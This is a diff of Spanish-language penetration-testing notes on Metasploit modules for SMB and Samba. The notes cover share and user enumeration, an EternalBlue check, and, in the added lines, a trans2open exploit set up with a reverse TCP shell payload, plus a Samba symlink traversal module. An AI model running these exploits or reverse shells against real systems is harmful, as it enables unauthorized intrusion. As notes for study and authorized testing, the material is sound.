@@ -193,13 +193,13 @@ Ver detección de heartbleed con nmap: <a href="enumeracion#nmap-heartbleed">Hea
 
 [https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/](https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/)
 
-**Auxiliares**
+**Escáners**
 
-Escáners
+* Auxiliares
 ~~~bash
 > use auxiliary/scanner/smb/pipe_auditor 
 > use auxiliary/scanner/smb/pipe_dcerpc_auditor
-> use auxiliary/scanner/smb/smb2
+> use auxiliary/scanner/smb/smb2 # Identifica si soporta SMB2
 > use auxiliary/scanner/smb/smb_enumshares
 > use auxiliary/scanner/smb/smb_enumusers
 > use auxiliary/scanner/smb/smb_login
@@ -208,14 +208,37 @@ Escáners
 > use auxiliary/scanner/rservices/rexec_login
 ~~~
 
-Comprobar si el host es vulnerable a eternalblue (MS17-010)
+* Comprobar si el host es vulnerable a eternalblue (MS17-010)
 ~~~bash
 > use auxiliary/scanner/smb/smb_ms17_010
 ~~~
 
-**RHOSTS**
+* RHOSTS
 ~~~bash
 msf> services -p 445 -R
+~~~
+
+**Samba 2.2.X**
+Las versiones de Samba 2.2.X suelen ser vulnerables a trans2open.
+
+* Exploit
+~~~bash
+> use exploit/linux/samba/trans2open
+> set VERBOSE true
+> set PAYLOAD linux/x86/shell_reverse_tcp
+> set LPORT 443
+> set LHOST $(hostname -i)
+~~~
+
+* RHOSTS
+~~~
+services -p 445 -R
+~~~
+
+**Samba 3.4.5**
+Symlink Directory Traversal
+~~~
+use auxiliary/admin/smb/samba_symlink/traversal
 ~~~
 
 <div class="grid">
